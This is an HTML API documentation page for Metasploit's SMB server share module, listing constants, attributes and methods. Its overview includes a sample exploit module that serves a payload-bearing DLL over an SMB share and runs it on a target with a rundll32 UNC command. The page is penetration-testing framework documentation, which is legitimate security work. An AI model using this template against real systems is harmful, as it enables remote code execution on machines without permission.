<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
  Module: Msf::Exploit::Remote::SMB::Server::Share
  
    &mdash; Documentation by YARD 0.9.26
  
</title>

  <link rel="stylesheet" href="../../../../../css/style.css" type="text/css" />

  <link rel="stylesheet" href="../../../../../css/common.css" type="text/css" />

<script type="text/javascript">
  pathId = "Msf::Exploit::Remote::SMB::Server::Share";
  relpath = '../../../../../';
</script>


  <script type="text/javascript" charset="utf-8" src="../../../../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../../../../js/app.js"></script>


  </head>
  <body>
    <div class="nav_wrap">
      <iframe id="nav" src="../../../../../class_list.html?1"></iframe>
      <div id="resizer"></div>
    </div>

    <div id="main" tabindex="-1">
      <div id="header">
        <div id="menu">
  
    <a href="../../../../../_index.html">Index (S)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../../Exploit.html" title="Msf::Exploit (class)">Exploit</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../Remote.html" title="Msf::Exploit::Remote (class)">Remote</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../SMB.html" title="Msf::Exploit::Remote::SMB (module)">SMB</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Server</a></span></span>
     &raquo; 
    <span class="title">Share</span>
  
</div>

        <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../../../../class_list.html">

        <svg width="24" height="24">
          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
        </svg>
    </a>
  
</div>
        <div class="clear"></div>
      </div>

      <div id="content"><h1>Module: Msf::Exploit::Remote::SMB::Server::Share
  
  
  
</h1>
<div class="box_info">
  

  
  
  
  
  <dl>
      <dt>Includes:</dt>
      <dd><span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Msf::Exploit::Remote::SMB::Server</a></span>, <span class='object_link'><a href="Share/Command/Close.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close (module)">Command::Close</a></span>, <span class='object_link'><a href="Share/Command/Negotiate.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate (module)">Command::Negotiate</a></span>, <span class='object_link'><a href="Share/Command/NtCreateAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx (module)">Command::NtCreateAndx</a></span>, <span class='object_link'><a href="Share/Command/ReadAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx (module)">Command::ReadAndx</a></span>, <span class='object_link'><a href="Share/Command/SessionSetupAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx (module)">Command::SessionSetupAndx</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2 (module)">Command::Trans2</a></span>, <span class='object_link'><a href="Share/Command/Trans2/FindFirst2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::FindFirst2 (module)">Command::Trans2::FindFirst2</a></span>, <span class='object_link'><a href="Share/Command/Trans2/QueryFileInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryFileInformation (module)">Command::Trans2::QueryFileInformation</a></span>, <span class='object_link'><a href="Share/Command/Trans2/QueryPathInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryPathInformation (module)">Command::Trans2::QueryPathInformation</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find (module)">InformationLevel::Find</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query (module)">InformationLevel::Query</a></span></dd>
  </dl>
  
  

  

  
  <dl>
    <dt>Defined in:</dt>
    <dd>lib/msf/core/exploit/remote/smb/server/share.rb<span class="defines">,<br />
  lib/msf/core/exploit/remote/smb/server/share/command.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/close.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/trans2.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/negotiate.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/read_andx.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/information_level.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/nt_create_andx.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/information_level/find.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/information_level/query.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/session_setup_andx.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/trans2/find_first2.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/trans2/query_file_information.rb,<br /> lib/msf/core/exploit/remote/smb/server/share/command/trans2/query_path_information.rb</span>
</dd>
  </dl>
  
</div>

<h2>Overview</h2><div class="docstring">
  <div class="discussion">
    
<p>class MetasploitModule &lt; Msf::Exploit::Remote</p>

<pre class="code ruby"><code class="ruby">  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::SMB::Server::Share

  def initialize(info={})
    super(update_info(info,
      &#39;Name&#39;           =&gt; &quot;Example Exploit&quot;,
      &#39;Description&#39;    =&gt; %q{
        Example exploit, the Server shares a DLL embedding the payload. A session
        can be achieved by executing &#39;rundll32.exe \\srvhost\share\test.dll,0&#39; from
        from the target.
      },
      &#39;License&#39;        =&gt; MSF_LICENSE,
      &#39;Author&#39;         =&gt;
        [
          &#39;Matthew Hall&#39;,
          &#39;juan vazquez&#39;
        ],
      &#39;References&#39;     =&gt;
        [
          [&#39;URL&#39;, &#39;https://github.com/rapid7/metasploit-framework/pull/3074&#39;]
        ],
      &#39;Payload&#39;        =&gt;
        {
          &#39;Space&#39;       =&gt; 2048,
          &#39;DisableNops&#39; =&gt; true
        },
        &#39;Platform&#39;       =&gt; &#39;win&#39;,
        &#39;Targets&#39;        =&gt;
          [
            [&#39;Windows XP SP3 / Windows 2003 SP2&#39;, {}],
          ],
        &#39;Privileged&#39;     =&gt; false,
        &#39;DisclosureDate&#39; =&gt; &quot;Mar 02 2015&quot;,
        &#39;DefaultTarget&#39;  =&gt; 0))

    register_options(
      [
        OptString.new(&#39;FILE_NAME&#39;, [ false, &#39;DLL File name to share&#39;, &#39;test.dll&#39;])
      ], self.class)

    deregister_options(&#39;FILE_CONTENTS&#39;)
  end

  def primer
    self.file_contents = generate_payload_dll
    print_status(&quot;File available on #{unc}...&quot;)
  end
end
</code></pre>


  </div>
</div>
<div class="tags">
  

</div><h2>Defined Under Namespace</h2>
<p class="children">
  
    
      <strong class="modules">Modules:</strong> <span class='object_link'><a href="Share/Command.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command (module)">Command</a></span>, <span class='object_link'><a href="Share/InformationLevel.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel (module)">InformationLevel</a></span>
    
  
    
  
</p>

  
    <h2>
      Constant Summary
      <small><a href="#" class="constants_summary_toggle">collapse</a></small>
    </h2>

    <dl class="constants">
      
        <dt id="FLAGS-constant" class="">FLAGS =
          
        </dt>
        <dd><pre class="code"><span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>FLAGS_REQ_RES</span> <span class='op'>|</span> <span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>FLAGS_CASE_SENSITIVE</span></pre></dd>
      
        <dt id="FLAGS2-constant" class="">FLAGS2 =
          
        </dt>
        <dd><pre class="code"><span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>FLAGS2_UNICODE_STRINGS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>FLAGS2_EXTENDED_SECURITY</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>FLAGS2_32_BIT_ERROR_CODES</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>FLAGS2_LONG_PATH_COMPONENTS</span></pre></dd>
      
        <dt id="CAPABILITIES-constant" class="">CAPABILITIES =
          
        </dt>
        <dd><pre class="code"><span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_UNIX_EXTENSIONS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_LARGE_WRITEX</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_LARGE_READX</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_PASSTHRU</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_DFS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_NT_FIND</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_LOCK_AND_READ</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_LEVEL_II_OPLOCKS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_STATUS32</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_RPC_REMOTE_APIS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_NT_SMBS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_LARGE_FILES</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_UNICODE</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>CAP_RAW_MODE</span></pre></dd>
      
        <dt id="CREATE_MAX_ACCESS-constant" class="">CREATE_MAX_ACCESS =
          
        </dt>
        <dd><pre class="code"><span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_WRITE_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_APPEND_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_EA_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_WRITE_EA_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_EXECUTE_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_DELETE_CHILD_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_ATTRIBUTES_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_WRITE_ATTRIBUTES_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_DELETE_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_CONTROL_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_WRITE_DAC_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_WRITE_OWNER_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_SYNC_ACCESS</span></pre></dd>
      
        <dt id="TREE_CONNECT_MAX_ACCESS-constant" class="">TREE_CONNECT_MAX_ACCESS =
          
        </dt>
        <dd><pre class="code"><span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_EA_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_EXECUTE_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_ATTRIBUTES_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_READ_CONTROL_ACCESS</span> <span class='op'>|</span>
<span class='const'><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span></span><span class='op'>::</span><span class='const'>SMB_SYNC_ACCESS</span></pre></dd>
      
    </dl>
  



  
  
  <h3 class="inherited">Constants included
     from <span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Msf::Exploit::Remote::SMB::Server</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Server.html#CONST-constant" title="Msf::Exploit::Remote::SMB::Server::CONST (constant)">CONST</a></span>, <span class='object_link'><a href="../Server.html#CRYPT-constant" title="Msf::Exploit::Remote::SMB::Server::CRYPT (constant)">CRYPT</a></span>, <span class='object_link'><a href="../Server.html#EVADE-constant" title="Msf::Exploit::Remote::SMB::Server::EVADE (constant)">EVADE</a></span>, <span class='object_link'><a href="../Server.html#UTILS-constant" title="Msf::Exploit::Remote::SMB::Server::UTILS (constant)">UTILS</a></span>, <span class='object_link'><a href="../Server.html#XCEPT-constant" title="Msf::Exploit::Remote::SMB::Server::XCEPT (constant)">XCEPT</a></span></p>


  <h2>Instance Attribute Summary <small><a href="#" class="summary_toggle">collapse</a></small></h2>
  <ul class="summary">
    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#file_contents-instance_method" title="#file_contents (instance method)">#<strong>file_contents</strong>  &#x21d2; String </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The contents of the provided file.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#file_name-instance_method" title="#file_name (instance method)">#<strong>file_name</strong>  &#x21d2; String </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The file name of the provided UNC.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#folder_name-instance_method" title="#folder_name (instance method)">#<strong>folder_name</strong>  &#x21d2; String </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The folder where the provided file lives.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#hi-instance_method" title="#hi (instance method)">#<strong>hi</strong>  &#x21d2; Integer </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The high 4 bytes for the file &#39;created time&#39;.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#lo-instance_method" title="#lo (instance method)">#<strong>lo</strong>  &#x21d2; Integer </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The low 4 bytes for the file &#39;created time&#39;.</p>
</div></span>
  
</li>

    
      <li class="public ">
  <span class="summary_signature">
    
      <a href="#share-instance_method" title="#share (instance method)">#<strong>share</strong>  &#x21d2; String </a>
    

    
  </span>
  
  
  
    
    
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>The share portion of the provided UNC.</p>
</div></span>
  
</li>

    
  </ul>



  
  
  <h3 class="inherited">Attributes included from <span class='object_link'><a href="../../SocketServer.html" title="Msf::Exploit::Remote::SocketServer (module)">Msf::Exploit::Remote::SocketServer</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../SocketServer.html#service-instance_method" title="Msf::Exploit::Remote::SocketServer#service (method)">#service</a></span></p>


  
    <h2>
      Instance Method Summary
      <small><a href="#" class="summary_toggle">collapse</a></small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#get_file_contents-instance_method" title="#get_file_contents (instance method)">#<strong>get_file_contents</strong>(client:, file: &#39;&#39;, folder: &#39;&#39;)  &#x21d2; String </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the file contents for the requested file.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#setup-instance_method" title="#setup (instance method)">#<strong>setup</strong>  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Setups the server configuration.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#smb_cmd_dispatch-instance_method" title="#smb_cmd_dispatch (instance method)">#<strong>smb_cmd_dispatch</strong>(cmd, c, buff)  &#x21d2; Integer </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Main dispatcher function.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#smb_conn-instance_method" title="#smb_conn (instance method)">#<strong>smb_conn</strong>(c)  &#x21d2; Hash </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>New connection handler, executed when there is a new connection.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#srvhost-instance_method" title="#srvhost (instance method)">#<strong>srvhost</strong>  &#x21d2; String </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Builds the server address.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#unc-instance_method" title="#unc (instance method)">#<strong>unc</strong>  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Builds the UNC Name for the shared file.</p>
</div></span>
  
</li>

      
    </ul>
  


  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Msf::Exploit::Remote::SMB::Server</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Server.html#on_client_close-instance_method" title="Msf::Exploit::Remote::SMB::Server#on_client_close (method)">#on_client_close</a></span>, <span class='object_link'><a href="../Server.html#on_client_connect-instance_method" title="Msf::Exploit::Remote::SMB::Server#on_client_connect (method)">#on_client_connect</a></span>, <span class='object_link'><a href="../Server.html#on_client_data-instance_method" title="Msf::Exploit::Remote::SMB::Server#on_client_data (method)">#on_client_data</a></span>, <span class='object_link'><a href="../Server.html#smb_error-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_error (method)">#smb_error</a></span>, <span class='object_link'><a href="../Server.html#smb_pool_update-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_pool_update (method)">#smb_pool_update</a></span>, <span class='object_link'><a href="../Server.html#smb_recv-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_recv (method)">#smb_recv</a></span>, <span class='object_link'><a href="../Server.html#smb_set_defaults-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_set_defaults (method)">#smb_set_defaults</a></span>, <span class='object_link'><a href="../Server.html#smb_stop-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_stop (method)">#smb_stop</a></span></p>

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../TcpServer.html" title="Msf::Exploit::Remote::TcpServer (module)">TcpServer</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../TcpServer.html#on_client_close-instance_method" title="Msf::Exploit::Remote::TcpServer#on_client_close (method)">#on_client_close</a></span>, <span class='object_link'><a href="../../TcpServer.html#on_client_connect-instance_method" title="Msf::Exploit::Remote::TcpServer#on_client_connect (method)">#on_client_connect</a></span>, <span class='object_link'><a href="../../TcpServer.html#ssl-instance_method" title="Msf::Exploit::Remote::TcpServer#ssl (method)">#ssl</a></span>, <span class='object_link'><a href="../../TcpServer.html#ssl_cert-instance_method" title="Msf::Exploit::Remote::TcpServer#ssl_cert (method)">#ssl_cert</a></span>, <span class='object_link'><a href="../../TcpServer.html#ssl_cipher-instance_method" title="Msf::Exploit::Remote::TcpServer#ssl_cipher (method)">#ssl_cipher</a></span>, <span class='object_link'><a href="../../TcpServer.html#ssl_compression-instance_method" title="Msf::Exploit::Remote::TcpServer#ssl_compression (method)">#ssl_compression</a></span>, <span class='object_link'><a href="../../TcpServer.html#start_service-instance_method" title="Msf::Exploit::Remote::TcpServer#start_service (method)">#start_service</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../SocketServer.html" title="Msf::Exploit::Remote::SocketServer (module)">Msf::Exploit::Remote::SocketServer</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../SocketServer.html#_determine_server_comm-instance_method" title="Msf::Exploit::Remote::SocketServer#_determine_server_comm (method)">#_determine_server_comm</a></span>, <span class='object_link'><a href="../../SocketServer.html#cleanup-instance_method" title="Msf::Exploit::Remote::SocketServer#cleanup (method)">#cleanup</a></span>, <span class='object_link'><a href="../../SocketServer.html#exploit-instance_method" title="Msf::Exploit::Remote::SocketServer#exploit (method)">#exploit</a></span>, <span class='object_link'><a href="../../SocketServer.html#on_client_data-instance_method" title="Msf::Exploit::Remote::SocketServer#on_client_data (method)">#on_client_data</a></span>, <span class='object_link'><a href="../../SocketServer.html#primer-instance_method" title="Msf::Exploit::Remote::SocketServer#primer (method)">#primer</a></span>, <span class='object_link'><a href="../../SocketServer.html#regenerate_payload-instance_method" title="Msf::Exploit::Remote::SocketServer#regenerate_payload (method)">#regenerate_payload</a></span>, <span class='object_link'><a href="../../SocketServer.html#srvport-instance_method" title="Msf::Exploit::Remote::SocketServer#srvport (method)">#srvport</a></span>, <span class='object_link'><a href="../../SocketServer.html#start_service-instance_method" title="Msf::Exploit::Remote::SocketServer#start_service (method)">#start_service</a></span>, <span class='object_link'><a href="../../SocketServer.html#stop_service-instance_method" title="Msf::Exploit::Remote::SocketServer#stop_service (method)">#stop_service</a></span>, <span class='object_link'><a href="../../SocketServer.html#via_string_for_ip-instance_method" title="Msf::Exploit::Remote::SocketServer#via_string_for_ip (method)">#via_string_for_ip</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/InformationLevel/Query.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query (module)">InformationLevel::Query</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/InformationLevel/Query.html#send_info_basic_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#send_info_basic_res (method)">#send_info_basic_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#send_info_network_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#send_info_network_res (method)">#send_info_network_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#send_info_standard_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#send_info_standard_res (method)">#send_info_standard_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_file_info_basic-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_file_info_basic (method)">#smb_cmd_trans_query_file_info_basic</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_file_info_standard-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_file_info_standard (method)">#smb_cmd_trans_query_file_info_standard</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_path_info_basic-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_path_info_basic (method)">#smb_cmd_trans_query_path_info_basic</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_path_info_network-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_path_info_network (method)">#smb_cmd_trans_query_path_info_network</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_path_info_standard-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_path_info_standard (method)">#smb_cmd_trans_query_path_info_standard</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/InformationLevel/Find.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find (module)">InformationLevel::Find</a></span></h3>
